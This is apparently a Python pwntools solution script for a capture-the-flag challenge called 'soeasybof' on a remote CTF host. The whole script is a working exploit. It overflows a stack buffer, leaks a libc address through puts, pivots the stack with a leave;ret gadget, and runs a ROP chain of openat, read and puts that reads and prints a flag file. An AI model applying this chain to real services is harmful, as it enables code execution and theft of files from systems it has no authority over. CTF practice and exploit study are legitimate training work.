from pwn import *

#p = process("./soeasybof")
p = remote("ctf.lordofpwn.kr",2222)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
e = ELF("./soeasybof")
e = ELF("./soeasybof")

#p = remote("ctf.lordofpwn.kr",1111)

p.sendafter(":","A"*0x100+"2SUNRIN2")

prdi = 0x0000000000400c63
leaveret = 0x0000000000400BCC

#open at
payload = "A"*0x108
payload += p64(prdi)
payload += p64(e.got["puts"])
payload += p64(e.plt["puts"])
payload += p32(0x400b82)

print hex(len(payload))

p.sendafter("!",payload)

libc_base = u64(p.recvuntil("\x7f")[-6:]+"\x00\x00") - libc.symbols["puts"]

print hex(libc_base)

prdx = 0x0000000000001b96
prsi = 0x0000000000023e6a
openat = 0x10fe70

payload = "A"*0x108
payload += p64(libc_base+prsi)
payload += p64(e.bss()+0x100)
payload += p64(e.plt["read"])
payload += p32(0x400b82)


p.sendafter("!",payload)
sleep(0.3)

#input flag
pay2  = p64(prdi)
pay2 += p64(0)
pay2 += p64(libc_base+prsi)
pay2 += p64(e.bss()+0x400)
pay2 += p64(e.plt["read"])

#call openat
pay2 += p64(prdi)
pay2 += p64(0xffffffffffffffff-100+1)
pay2 += p64(libc_base+prsi)
pay2 += p64(e.bss()+0x400)
pay2 += p64(libc_base+prdx)
pay2 += p64(0)
pay2 += p64(libc_base + openat)

#read
pay2 += p64(prdi)
pay2 += p64(3)
pay2 += p64(libc_base+prsi)
pay2 += p64(e.bss()+0x500)
pay2 += p64(libc_base+prdx)
pay2 += p64(0x400)
pay2 += p64(e.plt["read"])

#write
pay2 += p64(prdi)
pay2 += p64(e.bss()+0x500)
pay2 += p64(e.plt["puts"])


print hex(len(pay2))

p.sendafter("!",pay2)
sleep(0.3)

payload = "A"*0x100
payload += p64(e.bss()+0x100-8)
payload += p64(leaveret)
payload += p32(0x400b82)


p.sendafter("!",payload)

sleep(0.3)
p.sendafter("!","/home/pwn2/flag")
sleep(0.3)

p.interactive()
